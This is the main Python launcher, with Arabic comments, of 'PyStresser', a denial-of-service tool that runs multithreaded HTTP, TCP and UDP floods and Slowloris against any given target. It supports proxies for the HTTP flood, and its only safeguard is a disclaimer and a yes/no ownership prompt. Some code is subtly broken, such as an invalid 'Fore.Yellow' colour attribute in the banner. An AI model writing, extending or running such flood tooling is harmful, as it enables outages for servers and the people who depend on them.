#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PyStresser - أداة اختبار تحمل الخوادم
للاستخدام القانوني والأخلاقي فقط على خوادم تملكها
"""

import argparse
import threading
import time
import sys
import signal
from datetime import datetime
from colorama import init, Fore, Style

# استيراد الموديولات
from modules.http_flood import HTTPFlood
from modules.tcp_flood import TCPFlood
from modules.udp_flood import UDPFlood
from modules.slowloris import Slowloris
from modules.reporter import Reporter

init(autoreset=True)

VERSION = "1.0.0"

BANNER = f"""
{Fore.CYAN}{'='*60}
{Fore.RED}   ██▓███   ██▓   ███████ ▄▄▄█████▓ ██▀███   ██████ ██████ ██▀███  
{Fore.Yellow}  ▓██░  ██▒▓██▒  ▓██   ▓  ██▒ ▓▒▓██ ▒ ██▒██    ▒▒██    ▒▓██ ▒ ██▒
{Fore.GREEN}  ▓██░ ██▓▒▒██░  ▒████ ▒ ▓██░ ▒░▓██ ░▄█ ▒░ ▓██▄  ░ ▓██▄ ▓██ ░▄█ ▒
{Fore.BLUE}  ▒██▄█▓▒ ▒▒██░  ░▓█▒  ░ ▓██▓ ░ ▒██▀▀█▄   ▒   ██░  ▒   ██▒██▀▀█▄  
{Fore.MAGENTA}  ▒██▒ ░  ░░██████▒░▒█░    ▒██▒ ░ ░██▓ ▒██▒██████▒▒██████▒▒██▓ ▒██▒
{Fore.CYAN}  ▒▓▒░ ░  ░░ ▒░▓  ░ ▒ ░    ▒ ░░   ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░
{Fore.WHITE}  ░▒ ░     ░ ░  ░ ░       ░      ░▒ ░ ▒░░ ░▒  ░ ░░ ░▒  ░ ░  ░▒ ░ ▒░
{Fore.RED}  ░░         ░    ░ ░     ░        ░░   ░ ░  ░  ░  ░  ░  ░    ░░   ░ 
{Fore.YELLOW}             ░                      ░                           
{Fore.CYAN}{'='*60}
{Fore.WHITE}        PyStresser v{VERSION} - Smart Load Testing Tool
{Fore.RED}        {Fore.RED}للأغراض التعليمية والاختبار الذاتي فقط{Fore.WHITE}
{Fore.CYAN}{'='*60}
"""

class PyStresser:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': None,
            'end_time': None
        }
        self.lock = threading.Lock()
        
    def update_stats(self, success=True):
        """تحديث الإحصائيات بشكل آمن"""
        with self.lock:
            self.stats['total_requests'] += 1
            if success:
                self.stats['successful'] += 1
            else:
                self.stats['failed'] += 1
                
    def signal_handler(self, sig, frame):
        """معالج إشارة التوقف"""
        print(f"\n{Fore.YELLOW}[!] جاري إيقاف الاختبار...")
        self.running = False
        
    def run_http_test(self, target, threads, duration, method="GET", use_proxies=False):
        """تشغيل اختبار HTTP"""
        flooder = HTTPFlood(target, method, use_proxies, self.update_stats)
        
        for _ in range(threads):
            t = threading.Thread(target=flooder.flood, args=(duration,))
            t.daemon = True
            t.start()
            self.threads.append(t)
            
    def run_tcp_test(self, target_host, target_port, threads, duration):
        """تشغيل اختبار TCP"""
        flooder = TCPFlood(target_host, target_port, self.update_stats)
        
        for _ in range(threads):
            t = threading.Thread(target=flooder.flood, args=(duration,))
            t.daemon = True
            t.start()
            self.threads.append(t)
            
    def run_udp_test(self, target_host, target_port, threads, duration):
        """تشغيل اختبار UDP"""
        flooder = UDPFlood(target_host, target_port, self.update_stats)
        
        for _ in range(threads):
            t = threading.Thread(target=flooder.flood, args=(duration,))
            t.daemon = True
            t.start()
            self.threads.append(t)
            
    def run_slowloris_test(self, target_host, target_port, threads, duration):
        """تشغيل اختبار Slowloris"""
        slowloris = Slowloris(target_host, target_port, self.update_stats)
        
        for _ in range(threads):
            t = threading.Thread(target=slowloris.attack, args=(duration,))
            t.daemon = True
            t.start()
            self.threads.append(t)
            
    def wait_for_completion(self, duration):
        """انتظار انتهاء الاختبار"""
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            time.sleep(1)
            self.print_progress()
        self.running = False
        
    def print_progress(self):
        """طباعة تقدم الاختبار"""
        sys.stdout.write(f"\r{Fore.CYAN}[*] الطلبات: {self.stats['total_requests']} | "
                        f"النجاح: {self.stats['successful']} | "
                        f"الفشل: {self.stats['failed']}{Style.RESET_ALL}")
        sys.stdout.flush()
        
    def print_results(self):
        """طباعة النتائج النهائية"""
        print(f"\n\n{Fore.GREEN}{'='*50}")
        print(f"{Fore.GREEN}نتائج اختبار التحمل:")
        print(f"{Fore.GREEN}{'='*50}")
        print(f"{Fore.WHITE}إجمالي الطلبات: {Fore.YELLOW}{self.stats['total_requests']}")
        print(f"{Fore.WHITE}الطلبات الناجحة: {Fore.GREEN}{self.stats['successful']}")
        print(f"{Fore.WHITE}الطلبات الفاشلة: {Fore.RED}{self.stats['failed']}")
        
        if self.stats['total_requests'] > 0:
            success_rate = (self.stats['successful'] / self.stats['total_requests']) * 100
            print(f"{Fore.WHITE}نسبة النجاح: {Fore.CYAN}{success_rate:.2f}%")
            
        if self.stats['start_time'] and self.stats['end_time']:
            duration = (self.stats['end_time'] - self.stats['start_time']).total_seconds()
            if duration > 0:
                rps = self.stats['total_requests'] / duration
                print(f"{Fore.WHITE}الطلبات في الثانية: {Fore.MAGENTA}{rps:.2f}")
                
        print(f"{Fore.GREEN}{'='*50}")

def main():
    parser = argparse.ArgumentParser(description='PyStresser - أداة اختبار تحمل الخوادم')
    
    # الأهداف
    parser.add_argument('--target', '-t', help='الهدف (URL أو IP)')
    parser.add_argument('--port', '-p', type=int, default=80, help='المنفذ (افتراضي: 80)')
    
    # نوع الهجوم
    parser.add_argument('--method', '-m', choices=['http', 'tcp', 'udp', 'slowloris'], 
                       default='http', help='نوع الهجوم (افتراضي: http)')
    parser.add_argument('--http-method', default='GET', help='طريقة HTTP (GET, POST)')
    
    # إعدادات الاختبار
    parser.add_argument('--threads', '-c', type=int, default=100, help='عدد الخيوط (افتراضي: 100)')
    parser.add_argument('--duration', '-d', type=int, default=60, help='مدة الاختبار بالثواني (افتراضي: 60)')
    
    # خيارات إضافية
    parser.add_argument('--proxies', '-x', help='ملف يحتوي على بروكسيات (HTTP/SOCKS)')
    parser.add_argument('--no-banner', action='store_true', help='عدم عرض الشعار')
    
    args = parser.parse_args()
    
    if not args.no_banner:
        print(BANNER)
        
    # تأكيد المستخدم
    print(f"{Fore.RED}{'='*50}")
    print(f"{Fore.RED}⚠️  تحذير مهم ⚠️")
    print(f"{Fore.RED}{'='*50}")
    print(f"{Fore.WHITE}هذه الأداة للأغراض التعليمية فقط.")
    print(f"{Fore.WHITE}استخدمها فقط على خوادم تملكها أو لديك إذن كتابي.")
    print(f"{Fore.RED}{'='*50}")
    
    confirm = input(f"{Fore.YELLOW}هل أنت متأكد أنك تملك الهدف {args.target}؟ (yes/no): {Fore.WHITE}")
    if confirm.lower() != 'yes':
        print(f"{Fore.RED}❌ تم الإلغاء.")
        sys.exit(0)
        
    if not args.target:
        print(f"{Fore.RED}❌ خطأ: يجب تحديد هدف (-t أو --target)")
        sys.exit(1)
        
    # إنشاء كائن الأداة
    stresser = PyStresser()
    stresser.stats['start_time'] = datetime.now()
    
    # إعداد معالجة الإشارات
    signal.signal(signal.SIGINT, stresser.signal_handler)
    
    print(f"{Fore.GREEN}[+] بدء الاختبار على {args.target}:{args.port}")
    print(f"{Fore.CYAN}[*] نوع الهجوم: {args.method}")
    print(f"{Fore.CYAN}[*] عدد الخيوط: {args.threads}")
    print(f"{Fore.CYAN}[*] المدة: {args.duration} ثانية")
    print(f"{Fore.YELLOW}[!] اضغط Ctrl+C للإيقاف المبكر\n")
    
    stresser.running = True
    
    # تشغيل الاختبار المناسب
    try:
        if args.method == 'http':
            stresser.run_http_test(args.target, args.threads, args.duration, 
                                  args.http_method, bool(args.proxies))
        elif args.method == 'tcp':
            stresser.run_tcp_test(args.target, args.port, args.threads, args.duration)
        elif args.method == 'udp':
            stresser.run_udp_test(args.target, args.port, args.threads, args.duration)
        elif args.method == 'slowloris':
            stresser.run_slowloris_test(args.target, args.port, args.threads, args.duration)
            
        stresser.wait_for_completion(args.duration)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] تم الإيقاف بواسطة المستخدم")
        
    finally:
        stresser.running = False
        stresser.stats['end_time'] = datetime.now()
        stresser.print_results()
        
        # حفظ التقرير
        reporter = Reporter(stresser.stats, args)
        reporter.save_report()
        
        print(f"\n{Fore.GREEN}[+] تم حفظ التقرير في: stress_test_report.json")

if __name__ == "__main__":
    main()
